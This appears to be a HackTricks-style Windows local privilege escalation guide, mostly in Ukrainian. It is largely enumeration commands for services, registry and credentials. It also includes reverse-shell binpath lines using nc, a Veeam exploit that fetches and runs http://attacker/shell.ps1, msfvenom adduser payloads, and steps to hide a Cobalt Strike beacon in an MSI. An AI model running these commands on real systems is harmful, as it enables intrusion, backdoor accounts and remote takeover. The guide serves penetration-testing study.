# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Якщо ви не знаєте, що таке Windows Access Tokens, прочитайте наступну сторінку перед тим, як продовжити:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Для отримання додаткової інформації про ACLs - DACLs/SACLs/ACEs перегляньте наступну сторінку:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Якщо ви не знаєте, що таке integrity levels у Windows, вам слід прочитати наступну сторінку перед тим, як продовжити:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

У Windows є різні речі, які можуть **перешкодити вам виконати enumeration системи**, запускати executables або навіть **виявляти вашу активність**. Перш ніж починати privilege escalation enumeration, вам слід **прочитати** наступну **сторінку** і **проenumerate** всі ці **defenses** **mechanisms**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes, запущені через `RAiLaunchAdminProcess`, можна зловживати, щоб досягти High IL без prompt-ів, коли AppInfo secure-path checks обійдено. Перегляньте тут окремий workflow обходу UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation можна зловживати для довільного SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Останні Windows builds також запровадили шлях LPE через **SMB arbitrary-port**, де привілейована локальна NTLM authentication відбивається через повторно використане SMB TCP connection:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Перевірте, чи має Windows version будь-яку відому vulnerability (також перевірте застосовані patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Цей [site](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку детальної інформації про Microsoft security vulnerabilities. Ця база даних містить понад 4,700 security vulnerabilities, показуючи **massive attack surface**, яку створює Windows environment.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Any credential/Juicy info saved in the env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Історія PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Файли PowerShell Transcript

Ви можете дізнатися, як увімкнути це, у [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Деталі виконань PowerShell pipeline записуються, охоплюючи виконані команди, виклики команд і частини скриптів. Однак повні деталі виконання та результати виводу можуть не бути зафіксовані.

Щоб увімкнути це, дотримуйтесь інструкцій у розділі документації "Transcript files", обравши **"Module Logging"** замість **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Щоб переглянути останні 15 подій із логів PowersShell, ви можете виконати:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Повний запис активності та вмісту виконання скрипта фіксується, гарантуючи, що кожен блок коду документується під час його виконання. Цей процес зберігає повний слід аудиту кожної дії, що цінно для forensics і аналізу шкідливої поведінки. Документуючи всю активність у момент виконання, надаються детальні відомості про процес.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Журнали подій для Script Block можна знайти у Windows Event Viewer за шляхом: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, ви можете використати:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Налаштування Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Диски
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Ви можете скомпрометувати систему, якщо оновлення запитуються не через http**S**, а через http.

Почніть із перевірки, чи мережа використовує не-SSL WSUS update, запустивши в cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Або так у PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Якщо ви отримаєте відповідь на кшталт однієї з цих:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
А якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Тоді, **це можна експлуатувати.** Якщо останній registry дорівнює 0, тоді запис WSUS буде проігноровано.

Щоб експлуатувати цю вразливість, ви можете використовувати tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- це MiTM weaponized exploits scripts для інжекту 'fake' updates у non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
По суті, це flaw, який експлуатує цей bug:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Ви можете експлуатувати цю вразливість, використовуючи tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Сервіс виконує команду як SYSTEM.
## KrbRelayUp

У середовищах Windows **domain** за певних умов існує вразливість **local privilege escalation**. Ці умови включають середовища, де не застосовується **LDAP signing,** користувачі мають self-rights, що дозволяють їм налаштовувати **Resource-Based Constrained Delegation (RBCD),** а також можливість для користувачів створювати комп’ютери в межах domain. Важливо зазначити, що ці **requirements** виконуються за **default settings**.

Знайдіть **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Для отримання додаткової інформації про перебіг атаки див. [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Якщо** ці 2 registers **увімкнені** (value дорівнює **0x1**), тоді користувачі з будь-якими привілеями можуть **install** (execute) `*.msi` files як NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. This script writes out a precompiled MSI installer that prompts for a user/group addition (so you will need GIU access):
```
Write-UserAddMSI
```
Просто виконайте створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей tutorial, щоб дізнатися, як створити MSI wrapper за допомогою цього tools. Зверніть увагу, що ви можете обгорнути "**.bat**" file, якщо ви **просто** хочете **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** за допомогою Cobalt Strike або Metasploit **new Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Дайте проєкту назву, наприклад **AlwaysPrivesc**, використайте **`C:\privesc`** як location, виберіть **place solution and project in the same directory**, і натисніть **Create**.
- Продовжуйте натискати **Next**, доки не дійдете до кроку 3 із 4 (choose files to include). Натисніть **Add** і виберіть Beacon payload, який ви щойно згенерували. Потім натисніть **Finish**.
- Виділіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в **Properties** змініть **TargetPlatform** з **x86** на **x64**.
- Є й інші properties, які ви можете змінити, наприклад **Author** і **Manufacturer**, що можуть зробити встановлений app більш легітимним.
- Клацніть правою кнопкою миші по проєкту та виберіть **View > Custom Actions**.
- Клацніть правою кнопкою по **Install** і виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть ваш file **beacon.exe** і натисніть **OK**. Це забезпечить виконання beacon payload одразу після запуску інсталятора.
- У **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **build it**.
- Якщо показано попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили platform на x64.

### MSI Installation

Щоб виконати **installation** шкідливого `.msi` file у **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Щоб експлуатувати цю вразливість, ви можете використати: _exploit/windows/local/always_install_elevated_

## Антивірус і детектори

### Audit Settings

Ці налаштування визначають, що саме буде **logged**, тож вам слід звернути увагу
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, цікаво знати, куди надсилаються логи
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** призначений для **керування паролями локального Administrator**, забезпечуючи, щоб кожен пароль був **унікальним, випадково згенерованим і регулярно оновлюваним** на комп’ютерах, приєднаних до домену. Ці паролі надійно зберігаються в Active Directory і можуть бути доступні лише користувачам, яким надано достатні дозволи через ACLs, що дозволяє їм переглядати паролі локального admin, якщо це дозволено.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо активовано, **паролі у відкритому тексті зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист для Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати його пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Більше інформації про LSA Protection тут**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** було представлено в **Windows 10**. Його мета — захищати облікові дані, збережені на пристрої, від загроз на кшталт атак pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Кешовані облікові дані

**Доменні облікові дані** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, зазвичай створюються доменні облікові дані для цього користувача.\
[**Більше інформації про Cached Credentials тут**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Користувачі та групи

### Перелічити користувачів і групи

Ви повинні перевірити, чи мають будь-які з груп, до яких ви належите, цікаві дозволи
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Привілейовані групи

Якщо ви **належите до деякої привілейованої групи, ви можете бути здатні підвищити привілеї**. Дізнайтеся про привілейовані групи та як зловживати ними для підвищення привілеїв тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляція токенами

**Дізнайтеся більше** про те, що таке **token** на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перевірте наступну сторінку, щоб **дізнатися про цікаві token** та як зловживати ними:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Домашні папки
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Політика паролів
```bash
net accounts
```
### Отримати вміст буфера обміну
```bash
powershell -command "Get-Clipboard"
```
## Запущені процеси

### Права доступу до файлів і папок

Перш за все, під час переліку процесів **перевірте наявність паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений binary** або чи маєте права на запис у папку з binary, щоб використати можливі [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Перевірка дозволів бінарних файлів процесів**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Перевірка дозволів папок із бінарними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Ви можете створити дамп пам’яті запущеного процесу за допомогою **procdump** з sysinternals. Сервіси на кшталт FTP мають **credentials у відкритому вигляді в пам’яті**, спробуйте зробити дамп пам’яті та прочитати credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Небезпечні GUI apps

**Applications, що працюють як SYSTEM, можуть дозволити користувачеві запустити CMD або переглядати каталоги.**

Приклад: "Windows Help and Support" (Windows + F1), знайдіть "command prompt", натисніть на "Click to open Command Prompt"

## Services

Service Triggers дозволяють Windows запускати service, коли виникають певні умови (активність named pipe/RPC endpoint, ETW events, доступність IP, поява device, оновлення GPO тощо). Навіть без прав SERVICE_START ви часто можете запускати privileged services, спрацьовуючи їхні triggers. Дивіться техніки enumeration та activation тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

Отримати список services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Дозволи

Ви можете використовувати **sc**, щоб отримати інформацію про service
```bash
sc qc <service_name>
```
Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевіряти необхідний рівень привілеїв для кожної служби.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнути service

Якщо ви бачите цю помилку (наприклад, з SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Ви можете увімкнути його за допомогою
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Врахуйте, що служба upnphost залежить від SSDPSRV, щоб працювати (для XP SP1)**

**Інший workaround** цієї проблеми — запустити:
```
sc.exe config usosvc start= auto
```
### **Змінити шлях до бінарного файлу служби**

У сценарії, коли група "Authenticated users" має **SERVICE_ALL_ACCESS** для служби, можливе змінення виконуваного бінарного файлу служби. Щоб змінити й виконати **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Перезапуск service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Права можуть бути підвищені через різні дозволи:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштування service binary.
- **WRITE_DAC**: Увімкнює переналаштування permissions, що дає змогу змінювати service configurations.
- **WRITE_OWNER**: Дозволяє отримання ownership і переналаштування permissions.
- **GENERIC_WRITE**: Успадковує можливість змінювати service configurations.
- **GENERIC_ALL**: Також успадковує можливість змінювати service configurations.

Для виявлення та exploitation цієї вразливості можна використовувати _exploit/windows/local/service_permissions_.

### Services binaries weak permissions

Якщо service працює як **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейований domain account, але **low-privileged users можуть змінювати service EXE або його батьківську папку**, service часто можна hijack-нути шляхом **заміни binary і перезапуску service**.

**Перевірте, чи можете ви змінювати binary, який виконується service**, або чи маєте **write permissions на папку**, де розташований binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати кожен binary, який виконується service, за допомогою **wmic** (не в system32) і перевірити свої permissions за допомогою **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Також можна використовувати **sc** та **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** на виконуваному файлі служби або в каталозі, що його містить. Практичний ланцюжок зловживання:

1. Підтвердьте обліковий запис служби та шлях до виконуваного файлу за допомогою `sc qc <service_name>`.
2. Підтвердьте, що бінарний файл є записуваним за допомогою `icacls <path>`.
3. Замініть бінарний файл служби на payload або на коректний шкідливий бінарний файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся reboot / тригера служби).

Корисні автоматизовані перевірки:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Якщо service не дозволяє звичайному user перезапустити його, перевірте, чи запускається він automatically під час boot, чи має failure action, що relaunches його, або чи може бути triggered indirectly by application, яка його використовує.

### Services registry modify permissions

You should check if you can modify any service registry.\
You can **check** your **permissions** over a service **registry** doing:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Слід перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** права `FullControl`. Якщо так, то бінарний файл, який виконується службою, можна змінити.

Щоб змінити Path бінарного файлу, який виконується:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Деякі функції Windows Accessibility створюють per-user ключі **ATConfig**, які пізніше копіюються процесом **SYSTEM** в HKLM session key. Регістрова **symbolic link race** може перенаправити цей privileged write у **будь-який HKLM path**, надаючи primitive **arbitrary HKLM value write**.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Якщо у вас є цей дозвіл над registry, це означає, що **ви можете створювати підregistry з цього**. У випадку Windows services цього **достатньо для виконання довільного коду:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Якщо шлях до executable не взято в лапки, Windows намагатиметься виконати кожен шлях до кінця перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows намагатиметься виконати:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Перелічіть усі unquoted service paths, виключивши ті, що належать вбудованим службам Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Дії відновлення

